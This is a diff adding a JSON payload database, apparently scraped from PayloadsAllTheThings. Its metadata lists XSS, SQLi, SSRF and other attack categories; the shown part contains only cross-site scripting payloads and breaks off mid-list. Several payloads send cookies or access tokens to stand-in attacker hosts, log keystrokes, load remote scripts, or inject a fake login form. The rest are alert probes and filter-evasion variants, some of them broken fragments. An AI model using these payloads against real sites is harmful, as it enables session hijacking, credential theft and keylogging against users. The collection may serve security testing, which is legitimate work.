@@ -1,0 +1,6345 @@
+{
+  "metadata": {
+    "scraped_at": "2026-04-25T12:40:12.217791Z",
+    "total_payloads": 612,
+    "categories": [
+      "xss",
+      "sqli",
+      "ssrf",
+      "command_injection",
+      "path_traversal",
+      "xxe"
+    ]
+  },
+  "payloads": {
+    "xss": [
+      {
+        "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>\n  fetch('https://[ATTACKER.DOMAIN.TLD]', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"\n</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>debugger;</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert(1)</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert('XSS')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>ipt>alert('XSS')</scr<script>ipt>\n\"><script>alert('XSS')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>\\u0061lert('22')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>eval('\\x61lert(\\'33\\')')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>confirm(document.domain)</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script type=\"text/javascript\">\n    alert(document.domain);\n  </script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert('svg desc')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert('svg foreignObject')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert('svg title')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script type=\"text/javascript\">\n    alert('svg script');\n  </script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert(2)</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>alert(3)</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script type=\"text/javascript\">alert('sub-svg 1');</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script type=\"text/javascript\">alert('sub-svg 2');</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://10.10.10.10/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script src=//[ATTACKER.DOMAIN.TLD]></script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointerover=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointerdown=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointerenter=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointerleave=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointermove=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointerout=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<div onpointerup=\"alert(45)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<source onerror=\"javascript:alert(1)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<video src=_ onloadstart=\"alert(1)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<details/open/ontoggle=\"alert`1`\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg/onload='fetch(\"//host/a\").then(r=>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\" standalone=\"no\"?>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<animatetransform onbegin=\"alert('svg animatetransform onbegin')\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:](#wrapper-javascript)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:alert(1)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:prompt(1)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript://%0Aalert(1)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:alert(",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:prompt(document.cookie))",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:window.onerror=alert;throw%201)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "javascript:confirm(",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n\n<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <image xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg\" height=\"200\" width=\"200\"/>\n</svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <use xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning\"/>\n</svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <svg x=\"10\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>\n    <script type=\"text/javascript\">alert('sub-svg 1');</script>\n  </svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<svg x=\"200\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #ED2939\"/>\n    <script type=\"text/javascript\">alert('sub-svg 2');</script>\n  </svg>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x onerror=alert('XSS');>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x onerror=alert('XSS')//\n<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=1 onerror=alert(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=/ onerror=alert(2)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.8,
+        "description": "XSS payload from public repository",
+        "tags": [
+          "xss",
+          "script",
+          "event_handler"
+        ]
+      },
+      {
+        "payload": "<script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "Better payload replacing `<script>alert(1)</script>`:",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><script>alert('XSS')</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\"",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<img src=x onerror=alert('XSS')//",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><img src=x onerror=alert('XSS');>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<><img src=1 onerror=alert(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg\fonload=alert(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg/onload=alert('XSS')>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg onload=alert(1)//",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg id=alert(1) onload=eval(id)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "\"><svg/onload=alert(/XSS/)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg><script>alert('33')",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg><script>alert&lpar;'33'&rpar;",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<body onload=alert(/XSS/.source)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<video/poster/onerror=alert(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<video><source onerror=\"javascript:alert(1)\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<audio src onloadstart=alert(1)>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<script src=14.rs>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "data:text/html,<script>alert(0)</script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<value><![CDATA[<script>confirm(document.domain)</script>]]></value>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<script type=\"text/javascript\">",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<desc><script>alert('svg desc')</script></desc>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
+        "payload": "<foreignObject><script>alert('svg foreignObject')</script></foreignObject>",
+        "category": "xss",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.7,
+        "description": "XSS payload line",
+        "tags": [
+          "xss"
+        ]
+      },
+      {
